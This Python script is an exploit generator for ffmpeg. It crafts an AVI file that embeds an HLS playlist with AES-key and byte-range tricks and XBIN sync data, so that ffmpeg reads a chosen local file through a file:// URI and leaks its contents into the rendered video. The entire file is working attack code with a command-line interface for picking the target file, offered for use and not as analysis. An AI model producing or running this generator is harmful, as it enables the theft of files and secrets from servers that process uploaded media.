#!/usr/bin/env python3
"""
Made by Taylor Christian Newsome
An exploit generator targeting ffmpeg via crafted AVI + M3U + XBIN injection vectors.
"""

import struct
import argparse
import random
import string
from Crypto.Cipher import AES

# === Metadata & Constants ===
AUTHOR = "Made by Taylor Christian Newsome"

AVI_HEADER = (
    b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
    b"\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00"
    b"\x00}\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0"
    b"\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00"
    b"\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00LIST movi"
)

XBIN_HEADER = b'XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'
GAMMA = b'\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'

# === Template Definitions ===
ECHO_TEMPLATE = """### echoing {needed!r}
#EXT-X-KEY: METHOD=AES-128, URI="/dev/zero", IV=0x{iv}
#EXTINF:1,
#EXT-X-BYTERANGE: 16
/dev/zero
#EXT-X-KEY: METHOD=NONE
"""

FULL_PLAYLIST = """#EXTM3U
#EXT-X-VERSION:3
#EXT-X-MEDIA-SEQUENCE:0
{content}
#### random string to prevent caching: {rand}
#EXT-X-ENDLIST
# {author}
"""

EXTERNAL_REFERENCE_PLAYLIST = """
#### External reference: reading {size} bytes from {filename} (offset {offset})
#EXTINF:1,
#EXT-X-BYTERANGE: {size}@{offset}
{filename}
"""

# === Core Logic ===

def echo_block(block: bytes) -> str:
    aes = AES.new(GAMMA, AES.MODE_ECB)
    decrypted = aes.decrypt(block)
    iv = ''.join(f"{x ^ y:02x}" for x, y in zip(block, decrypted))
    return ECHO_TEMPLATE.format(needed=block, iv=iv)

def gen_xbin_sync() -> list:
    return ([128 + 64 - i - 1 if i % 2 == 0 else 0 for i in range(60)] +
            [128 + i - 1 for i in range(4, 0, -1)] +
            [0, 0] +
            [128 + i - 1 for i in range(12, 0, -1)] +
            [0, 0])

def echo_seq(seq: bytes) -> str:
    return ''.join(echo_block(seq[i:i + 16]) for i in range(0, len(seq), 16))

def gen_xbin_packet_playlist(filename: str, offset: int, size: int) -> tuple:
    return EXTERNAL_REFERENCE_PLAYLIST.format(filename=filename, offset=offset, size=size), offset + size

def gen_xbin_playlist(filename_to_read: str) -> str:
    playlist_parts = [echo_block(XBIN_HEADER)]
    next_delta = 5

    for max_offs, fname in [(5000, filename_to_read), (500, "file:///dev/zero")]:
        offset = 0
        while offset < max_offs:
            for _ in range(10):
                part, new_offset = gen_xbin_packet_playlist(fname, offset, 0xf0 - next_delta)
                playlist_parts.append(part)
                next_delta = 0
                offset = new_offset
        playlist_parts.append(echo_seq(bytes(gen_xbin_sync())))

    rand_suffix = ''.join(random.choice(string.ascii_lowercase) for _ in range(60))
    return FULL_PLAYLIST.format(content=''.join(playlist_parts), rand=rand_suffix, author=AUTHOR)

def make_playlist_avi(playlist: str, fake_packets: int = 1000, fake_packet_len: int = 3) -> bytes:
    content = b'GAB2\x00\x02\x00' + b'\x00' * 10 + playlist.encode('ascii')
    packet = b'00tx' + struct.pack('<I', len(content)) + content
    dcpkt = b'00dc' + struct.pack('<I', fake_packet_len) + b'\x00' * fake_packet_len
    return AVI_HEADER + packet + dcpkt * fake_packets

# === Entry Point ===

def main():
    parser = argparse.ArgumentParser(description='🎥 Exploit generator for ffmpeg using AVI + HLS playlist + XBIN techniques')
    parser.add_argument('filename', help='Target file to reference (must start with a URI scheme, e.g., file://)')
    parser.add_argument('output_avi', help='Destination path for the crafted AVI file')
    args = parser.parse_args()

    if '://' not in args.filename:
        parser.error("Target filename must include a protocol prefix (e.g., file://)")

    print(f"[+] Generating malicious playlist for {args.filename}")
    playlist = gen_xbin_playlist(args.filename)

    print(f"[+] Crafting AVI container")
    avi_data = make_playlist_avi(playlist)

    print(f"[+] Writing to {args.output_avi}")
    with open(args.output_avi, 'wb') as f:
        f.write(avi_data)

    print(f"[✓] Exploit AVI generated: {args.output_avi}")

if __name__ == "__main__":
    main()
